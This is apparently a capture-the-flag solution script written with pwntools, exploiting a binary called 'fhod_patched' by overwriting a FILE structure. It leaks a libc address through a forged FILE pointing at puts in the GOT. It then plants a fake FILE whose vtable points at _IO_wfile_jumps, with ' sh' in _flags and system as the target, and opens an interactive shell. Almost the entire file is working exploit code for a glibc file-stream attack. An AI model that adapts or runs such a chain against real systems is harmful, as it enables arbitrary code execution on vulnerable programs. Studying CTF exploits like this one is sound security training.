#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
encode  = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack((l[:-1] if l[-1] == '\n' else l).ljust(8, b"\x00"))

exe = "./fhod_patched"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])
	) if args.REMOTE else process([exe], aslr=True)

READ_MODE  = 0x1
WRITE_MODE = 0x2

def menu(idx):
	io.sendlineafter(b"(FHoD) $ ", encode(idx))

def open_file(name, mode):
	menu(1)
	io.sendlineafter(b": ", encode(name))
	menu(mode)

def read_file():
	menu(2)
	pass

def overwrite_fp(fp: FileStructure):
	menu(5)
	io.sendlineafter(b": ", encode(fp))

def write_to_file(content):
	menu(3)
	io.sendlineafter(b": ", encode(content))

def close_file():
	menu(4)

if __name__ == "__main__":

	"""
	# Payload using pwntools FileStructure:

	fp = FileStructure(0)
	fp.flags = 0xfbad0000 | 0x800
	fp._IO_read_end = fp._IO_write_base = elf.got.puts
	fp._IO_write_ptr = elf.got.puts + 0x8
	fp.fileno = 0x1
	payload = bytes(fp)[:120]
	"""

	payload = flat(
		0xfbad0000 | 0x800, # _flags
		0x0, # _IO_read_ptr
		elf.got.puts, # _IO_read_end
		0x0, # _IO_read_base
		elf.got.puts, # _IO_write_base
		elf.got.puts+0x8, # _IO_write_ptr
		0x0, # _IO_write_end
		0x0, # _IO_buf_base
		0x0, # _IO_buf_end
		0x0, # _IO_save_base
		0x0, # _IO_backup_base
		0x0, # _IO_save_end
		0x0, # _markers
		0x0, # _chain
		0x1, # _fileno
	)

	""" When we open a file, we can get a leak to heap. """
	open_file("/tmp/test", WRITE_MODE)
	io.recvuntil(b"Descriptor: ")
	io_file = hexleak(io.recvline())
	info("io_file @ %#x" % io_file)

	overwrite_fp(payload)
	write_to_file("AAAA")
	puts = fixleak(io.recvuntil(b"AAAA")[:-4])
	libc.address = puts - libc.sym.puts
	vtable = libc.sym._IO_wfile_jumps - 0x18
	info("puts    @ %#x" % puts)
	info("libc    @ %#x" % libc.address)
	info("vtable  @ %#x" % vtable)

	"""
	# Payload using pwntools FileStructure:

	fp = FileStructure(0)
	fp.flags = u64(b" sh".ljust(8, b"\x00"))
	fp._IO_backup_base = (io_file+0x58)-0x68
	fp._IO_save_end = libc.sym.system
	fp._lock = elf.bss()
	fp._codecvt = io_file+0x20
	fp._wide_data = io_file-0x90
	fp.vtable = vtable
	payload = bytes(fp)
	"""

	payload = flat(
		unpack(b" sh".ljust(8, b"\x00")), # _flags
		0x0, # _IO_read_ptr
		0x0, # _IO_read_end
		0x0, # _IO_read_base
		0x0, # _IO_write_base
		0x0, # _IO_write_ptr
		0x0, # _IO_write_end
		0x0, # _IO_buf_base
		0x0, # _IO_buf_end
		0x0, # _IO_save_base
		(io_file+0x58)-0x68, # _IO_backup_base
		libc.sym.system, # _IO_save_end
		0x0, # _markers
		0x0, # _chain
		0x0, # _fileno
		0x0, # _flags2
		0x0, # old_offset | _cur_column | _vtable_offset | _shortbuf
		elf.bss(), # _lock -> needs to be inside a writable segment
		0x0, # _offset
		io_file+0x20, # _codecvt
		io_file-0x90, # _wide_data -> point in to _wide_data
		0x0, # _freeres_list
		0x0, # _freeres_buf
		0x0, # __pad5
		0x0, # _mode -> This must be set to 0 otherwise fwrite won't reach: fwrite+189
		0x0, # _unused2
		0x0, # 8-byte padding before _IO_jump_t *vtable
		vtable
	)
	overwrite_fp(payload)
	write_to_file("@theflash2k")

	io.interactive()
